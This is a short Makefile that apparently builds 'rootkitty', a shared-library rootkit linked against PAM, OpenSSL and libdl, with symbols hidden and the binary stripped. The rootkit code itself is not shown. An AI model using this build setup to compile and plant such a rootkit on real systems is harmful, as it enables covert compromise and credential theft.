CC = gcc
SRCS = src/rootkitty-lib.c 
OUT = rootkitty.so
CFLAGS = -lpam -fPIC -shared -lssl -ldl -fvisibility=hidden -s 
DBG = $(CFLAGS) -Wall -Wextra -Wshadow -g -O2
#default
all:
	@echo "[+] Compiling rootkitty... >^..^<"
	$(CC) $(SRCS) -o $(OUT) $(CFLAGS) $(LIBS)

# for debugging purposes
debug:
	@echo "[+] Compiling rootkitty + debug...  >^..^<"
	$(CC) $(SRCS) -o $(OUT) $(DBG)
